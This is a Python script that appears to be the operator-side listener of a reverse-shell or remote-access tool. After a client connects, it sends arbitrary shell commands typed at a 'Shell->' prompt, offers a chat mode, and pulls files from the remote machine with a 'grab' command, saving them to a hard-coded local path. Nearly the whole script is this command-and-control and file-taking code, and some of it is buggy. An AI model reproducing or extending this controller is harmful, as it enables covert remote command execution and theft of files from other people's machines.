import socket

def transfer(conn, x):
    conn.sendall(x)
    f = open('C:/Users/Preet/Desktop/test.png', 'wb')
    while True:
        bits = conn.recv(1024)

        if b'Unable to find the file' in bits:
            print('Unable to find the file')
            break

        if bits.endswith(b'Done'):
            print("[+] Transfer Complete")
            print("[+] File stored at C:/Users/Preet/Desktop/ as test.png")
            print("[+] Change the file extension accordingly")
            f.close()
            break
        f.write(bits)



def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('127.0.0.1', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from:", addr)

    while True:

        print('Press'
              '1). To chat'
              '2). For File Transfer'
              )

        command = input("Shell->")
        if command == '1':
            conn.sendall(command.encode())
            data = conn.recv(1024)
            print(data)
            while True:
                x = input("Enter->")
                conn.sendall(x.encode())
                if x=='bye':
                    break
                data = conn.recv(1024)
                data.decode()
                print(data)

        elif 'terminate' in command:
            conn.sendall('terminate')
            break
        elif command == '2':
            conn.sendall(command.encode())
            data = conn.recv(1024)
            print(data)
            while True:
                if b"Not authorized" in data:
                    break
                x = input("For file Transfer type (grab*file_name)")
                transfer(conn, x.encode())
                print("Do you want to continue--Press [1(yes) or 2(no)]")
                m = int(input("Enter"))
                if (m==1):
                    print("ok")
                else:
                    break
            
        # elif 'grab' in command:
        #     transfer(conn, command.encode())
        else:
            conn.sendall(command.encode('utf-8'))
            data = conn.recv(1024)
            data.decode()
            print(data)


def main():
    connect()


main()
